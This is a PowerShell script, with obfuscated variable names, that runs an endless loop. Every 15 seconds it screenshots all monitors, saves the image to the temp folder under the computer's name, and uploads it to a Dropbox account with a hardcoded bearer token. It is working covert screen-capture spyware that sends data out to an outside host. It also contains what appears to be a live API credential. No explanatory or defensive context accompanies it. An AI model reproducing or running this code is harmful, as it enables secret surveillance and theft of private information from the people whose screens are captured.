function d { 
    [CmdletBinding()] 
    param ( 
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)] 
        [Alias("x")] 
        [string]$a 
    ) 
    $b = "sl.u.AFzX06luOztFyW_MJZaWxCkXlA5gOMehKFvHOuOamf4E0TIfDuwfIKGj-ZYlPqO0dd-OGiijhYu4ttCWlqep8H3kvQX2RDDzq9eCm9Z3zSt9qZIqPMN3HBUbAn3a-31HBqD_4mLzq4nIINgI-QIsJbHidvtnLOHT2qZnb4r3jYBpfllPZr64wCsci4CcJFM2MtzE4Br6UNjCg5fN9G9HjEJNz9CZs-m3OTRyJb7NNtc4z4SM2Zf-XG1pb43NDT-3d5U1sNwz29bX81tvXro2prZxLjYDPhthSlbuNxbYpLsb4ZuALWa9bQGS0Bey4FJrPN_k4gY3wqVVmyTOBWniOXl0Ca-hQZbFoZWUfXPddqG-Ldzum_YtO9oCG5H_sD-CCbmCY5Y9E9AfvbJmCiWkXgO6b9lIz2V-2RXUHbXOnnMe7WddUBhcuhHtM-XmLuU5eb4HlQoxjNK_xaP0sQZI1L2cdss0gYUjMEM7vsKGeNfU5skdJ4-LEk6tkLbwy8YPjn7pM0-aRU59uBywlkqS-KuSFCGMKWEw4inTVQXD04MQpzxeoZtqYWFgRuGeBGtyZaOWIvqNvUzbq4yyB4levFECmERmmFmK6GX5Pr6p_oWUxsXYdXiYJ-jtmOTawhDxnSegIjP3rsuFkyuiviMayjSSXFvTwzh9XWOmFrmHNdbQDzsWugTEwdINdapMYfBGHRWOaeeFsXZKI2P6vtOZv_yd3tK9dbBK0HtGyZzTJuNXcgjVy3Vi4BkP1WHp68Wkw_QnGcUct7R3F31h4gwMt5TcSxvpQzFsRs1aAoIDJiyb7SEFEcJvGLWWva2oO0pTseHjXHgNbGVyTpV3x0CRZlIxxDv9Mg5M92MgfVZoiDzTYNtWldMrT96X8sa7oGWTqb_YrDnIVqPJMxI1Daaj1A05ZubeugULF1S3darF0zlLZa20Fog4XnuY7h5fkn3aDhc2pD1jbUEn0QoGPshHYcuYp0fVcLde179hr7dyO7pkysplxKYaj-5xs7vqDfrba9rDLScfEgS-0P0owsSfBA3fjv-2Ay7kINokxm7OEDDT1dJGSV_0b96y6rtKdtMQLgg0F2hdQHB4DCGN9tvxAtnhTEqUL_WoAluxUfyJJZz1e9-r3CbtYzA0Yfve3UIUK8OIHaoJ-Q2JnT6JIe_JQPJw_A-jN9cNuWuJ-TbFHToZUcL3-eVtPBCfGbEPZ1z5dkJ-fcjR_suhzDwsMNmWAt_V-U--rVzN2HnlP8pbOOJHKPoCseLjUWTG6gnq-kN1Z0hJGVKdoHsD0y5gbXZeohT9eTucDehQZmxCdkFQmqo82AMdFo_e-DwNDkVTQm6wKeTveY4DpTfePya4CcjEONK3Tsqw8jf_UxAhxyy5MBleG38k1Gril9C3L45TyJHMIfEbh1bWBjXJVtgUsQ-CU8PR"
    $c = Split-Path $a -leaf 
    $d = "/$c" 
    $e = '{ "path": "' + $d + '", "mode": "add", "autorename": true, "mute": false }' 
    $f = "Bearer " + $b 
    $g = New-Object "System.Collections.Generic.Dictionary[[String],[String]]" 
    $g.Add("Authorization", $f) 
    $g.Add("Dropbox-API-Arg", $e) 
    $g.Add("Content-Type", 'application/octet-stream') 
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $a -Headers $g 
} 

while(1){ 
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 
    $s = [Windows.Forms.Screen]::AllScreens 
    $t = ($s.Bounds.Top | Measure-Object -Minimum).Minimum 
    $l = ($s.Bounds.Left | Measure-Object -Minimum).Minimum 
    $w = ($s.Bounds.Right | Measure-Object -Maximum).Maximum 
    $h = ($s.Bounds.Bottom | Measure-Object -Maximum).Maximum 
    $z = [Drawing.Rectangle]::FromLTRB($l, $t, $w, $h) 
    $i = New-Object System.Drawing.Bitmap ([int]$z.Width), ([int]$z.Height) 
    $j = [Drawing.Graphics]::FromImage($i) 
    $j.CopyFromScreen($z.Location, [Drawing.Point]::Empty, $z.Size) 
    $k = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-C.png" 
    $i.Save($k) 
    $j.Dispose() 
    $i.Dispose() 
    Start-Sleep -Seconds 15 
    $k | d 
}
